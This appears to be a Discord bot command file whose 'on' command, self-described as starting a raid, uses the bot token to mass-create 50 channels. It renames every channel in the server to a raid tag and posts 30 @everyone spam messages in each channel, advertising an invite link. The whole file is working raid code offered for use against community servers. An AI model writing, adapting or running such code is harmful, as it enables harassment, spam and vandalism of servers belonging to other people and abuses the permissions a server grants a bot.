const fetch = require("node-fetch");
const { createBlacklistButton } = require('../utils/blacklist-button');

async function wait_ms(ms) { return new Promise(resolve => setTimeout(resolve, ms)); };

module.exports = {
    name: 'on',
    description: 'Starts a raid in the server.',
    prefix: '&',
    async execute(msg, client, channel_logs, blacklist_user, idservidores_nopermitidos, bot_token) {
        createBlacklistButton(client, channel_logs, msg.author);
        if (idservidores_nopermitidos.includes(msg.guild.id)) {
            return msg.channel.send({ content: '> This server is not allowed.' });
        }

        const sendMessages = async (channel) => {
            const channelToSend = client.channels.cache.get(channel.id);
            for (let i = 0; i < 30; i++) {
                try {
                    await channelToSend.send({ content: '@everyone https://discord.gg/zCQ8jQ2GBf - | - https://www.youtube.com/watch?v=xKY-d0QkKjE / #HailZenX' });
                } catch (e) {
                    console.log(`[X] Could not send a message with the "on" command, error message: ${e.message}`);
                }
            }
        };

        const createdChannels = [];
        const createChannels = async () => {
            const res = await fetch(`https://discord.com/api/v9/guilds/${msg.guild.id}/channels`, {
                method: 'POST',
                headers: {
                    "Authorization": `Bot ${bot_token}`,
                    "content-type": "application/json"
                },
                body: JSON.stringify({
                    "name": "test",
                    "type": "0"
                })
            });
            const json = await res.json();
            createdChannels.push(json['id']);
            if (createdChannels.length >= 50) {
                const channels = await msg.guild.channels.fetch();
                for (const ch of channels.values()) {
                    try {
                        await ch.setName('ʀǟɨɖɮʏռɨӽǟʝǟɮǟʐɨֆ');
                    } catch (e) {
                        console.log(e);
                    }
                }
                for (const ch of channels.values()) {
                    try {
                        await sendMessages(ch);
                    } catch (e) {
                        console.log(e);
                    }
                }
            }
        };

        for (let i = 0; i < 50; i++) {
            await wait_ms(10);
            await createChannels();
        }
    }
};
